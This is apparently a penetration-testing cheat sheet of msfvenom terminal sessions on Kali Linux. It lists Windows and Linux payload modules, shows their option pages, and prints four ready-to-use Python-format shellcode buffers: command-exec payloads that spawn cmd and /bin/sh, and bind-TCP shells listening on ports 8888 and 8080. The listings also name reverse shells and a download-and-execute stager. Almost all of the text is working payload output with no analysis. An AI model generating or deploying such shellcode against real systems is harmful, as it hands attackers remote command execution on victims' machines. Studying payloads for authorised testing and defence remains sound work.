# msfvenom command for shellcode

* Windows shellcode list
```
root@kali:~/Desktop# msfvenom -l payloads | grep windows
...
    cmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua
    cmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)
    cmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)
    cmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby
    cmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.
...
```

* Example of windows shellcode
```
root@kali:~/Desktop# msfvenom -p windows/exec --list-options
Options for payload/windows/exec:
=========================


       Name: Windows Execute Command
     Module: payload/windows/exec
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 185
       Rank: Normal

Provided by:
    vlad902 <vlad902@gmail.com>
    sf <stephen_fewer@harmonysecurity.com>

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
CMD                        yes       The command string to execute
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)

Description:
  Execute an arbitrary command



Advanced options for payload/windows/exec:
=========================

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    PrependMigrate      false            yes       Spawns and runs shellcode in new process
    PrependMigrateProc                   no        Process to spawn and run shellcode in
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module

Evasion options for payload/windows/exec:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------

root@kali:~/Desktop# msfvenom -p windows/exec CMD='cmd' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 188 bytes
Final size of python file: 912 bytes
buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += "\xff\xd5\x63\x6d\x64\x00"
```

* Example of windows binding shellcode
```
root@kali:~/Desktop# msfvenom -p windows/shell_bind_tcp --list-options
Options for payload/windows/shell_bind_tcp:
=========================


       Name: Windows Command Shell, Bind TCP Inline
     Module: payload/windows/shell_bind_tcp
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 328
       Rank: Normal

Provided by:
    vlad902 <vlad902@gmail.com>
    sf <stephen_fewer@harmonysecurity.com>

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LPORT     4444             yes       The listen port
RHOST                      no        The target address

Description:
  Listen for a connection and spawn a command shell



Advanced options for payload/windows/shell_bind_tcp:
=========================

    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AutoRunScript                                no        A script to run automatically on session creation.
    CommandShellCleanupCommand                   no        A command to run before the session is closed
    CreateSession               true             no        Create a new session for every successful login
    InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
    PrependMigrate              false            yes       Spawns and runs shellcode in new process
    PrependMigrateProc                           no        Process to spawn and run shellcode in
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module

Evasion options for payload/windows/shell_bind_tcp:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
root@kali:~/Desktop# msfvenom -p windows/shell_bind_tcp LPORT=8888 -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of python file: 1582 bytes
buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += "\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"
buf += "\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x22\xb8\x89"
buf += "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57"
buf += "\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
buf += "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63"
buf += "\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59"
buf += "\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
buf += "\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56"
buf += "\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e"
buf += "\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
buf += "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
buf += "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
buf += "\x53\xff\xd5"
```

* Linux shellcode list
```
root@kali:~/Desktop# msfvenom -l payloads | grep linux
...
    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker
    linux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
...
```

* Example of linux shellcode
```
root@kali:~/Desktop# msfvenom -p linux/x64/exec --list-options
Options for payload/linux/x64/exec:
=========================


       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 40
       Rank: Normal

Provided by:
    ricky

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command



Advanced options for payload/linux/x64/exec:
=========================

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module

Evasion options for payload/linux/x64/exec:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------


root@kali:~/Desktop# msfvenom -p linux/x64/exec CMD='/bin/sh' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of python file: 238 bytes
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"
```

* Example of linux binding shellcode
```
root@kali:~/Desktop# msfvenom -p linux/x64/shell_bind_tcp --list-options
Options for payload/linux/x64/shell_bind_tcp:
=========================


       Name: Linux Command Shell, Bind TCP Inline
     Module: payload/linux/x64/shell_bind_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 86
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LPORT  4444             yes       The listen port
RHOST                   no        The target address

Description:
  Listen for a connection and spawn a command shell



Advanced options for payload/linux/x64/shell_bind_tcp:
=========================

    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AppendExit                  false            no        Append a stub that executes the exit(0) system call
    AutoRunScript                                no        A script to run automatically on session creation.
    CommandShellCleanupCommand                   no        A command to run before the session is closed
    CreateSession               true             no        Create a new session for every successful login
    InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
    PrependChrootBreak          false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork                 false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid               false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid             false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid            false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid            false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid             false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid               false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module

Evasion options for payload/linux/x64/shell_bind_tcp:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------

root@kali:~/Desktop# msfvenom -p linux/x64/shell_bind_tcp LPORT=8080 -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 86 bytes
Final size of python file: 424 bytes
buf =  ""
buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += "\x97\x52\xc7\x04\x24\x02\x00\x1f\x90\x48\x89\xe6\x6a"
buf += "\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48"
buf += "\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48"
buf += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99"
buf += "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
buf += "\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```
